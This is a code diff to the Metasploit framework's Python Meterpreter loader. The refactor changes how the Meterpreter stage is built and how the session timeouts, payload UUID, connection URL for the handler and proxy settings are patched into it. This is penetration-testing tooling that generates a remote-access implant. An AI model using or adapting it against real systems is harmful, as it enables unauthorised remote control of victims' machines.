@@ -14,6 +14,7 @@ module Msf
 
 module Payload::Python::MeterpreterLoader
 
+  include Msf::Payload::Python
   include Msf::Payload::UUID::Options
   include Msf::Sessions::MeterpreterOptions
 
@@ -32,6 +33,10 @@ module Payload::Python::MeterpreterLoader
     ], self.class)
   end
 
+  def stage_payload(opts={})
+    stage_meterpreter(opts)
+  end
+
   # Get the raw Python Meterpreter stage and patch in values based on the
   # configuration
   #
@@ -40,7 +45,7 @@ module Payload::Python::MeterpreterLoader
   #   HTTP(S) transports.
   # @option opts [String] :http_proxy_port The port to use when a proxy  host is
   #   set for HTTP(S) transports.
-  # @option opts [String] :http_url The HTTP(S) URL to patch in to
+  # @option opts [String] :url The HTTP(S) URL to patch in to
   #   allow use of the stage as a stageless payload.
   # @option opts [String] :http_user_agent The value to use for the User-Agent
   #   header for HTTP(S) transports.
@@ -49,31 +54,36 @@ module Payload::Python::MeterpreterLoader
   # @option opts [String] :uuid A specific UUID to use for sessions created by
   #   this stage.
   def stage_meterpreter(opts={})
+    ds = opts[:datastore] || datastore
     met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')
 
     var_escape = lambda { |txt|
       txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
     }
 
-    if datastore['PythonMeterpreterDebug']
+    if ds['PythonMeterpreterDebug']
       met = met.sub("DEBUGGING = False", "DEBUGGING = True")
     end
 
-    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
-    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
-    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{datastore['SessionRetryTotal']}")
-    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{datastore['SessionRetryWait']}")
+    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{ds['SessionExpirationTimeout']}")
+    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{ds['SessionCommunicationTimeout']}")
+    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{ds['SessionRetryTotal']}")
+    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{ds['SessionRetryWait']}")
 
     uuid = opts[:uuid] || generate_payload_uuid
     uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
     met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")
 
-    # patch in the stageless http(s) connection url
-    met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(opts[:http_url])}'") if opts[:http_url].to_s != ''
-    met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(opts[:http_user_agent])}'") if opts[:http_user_agent].to_s != ''
+    http_user_agent = opts[:http_user_agent] || ds['MeterpreterUserAgent']
+    http_proxy_host = opts[:http_proxy_host] || ds['PayloadProxyHost'] || ds['PROXYHOST']
+    http_proxy_port = opts[:http_proxy_port] || ds['PayloadProxyPort'] || ds['PROXYPORT']
 
-    if opts[:http_proxy_host].to_s != ''
-      proxy_url = "http://#{opts[:http_proxy_host]}:#{opts[:http_proxy_port]}"
+    # patch in the stageless http(s) connection url
+    met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(opts[:url])}'") if opts[:url].to_s != ''
+    met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''
+
+    if http_proxy_host.to_s != ''
+      proxy_url = "http://#{http_proxy_host}:#{http_proxy_port}"
       met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
     end
 
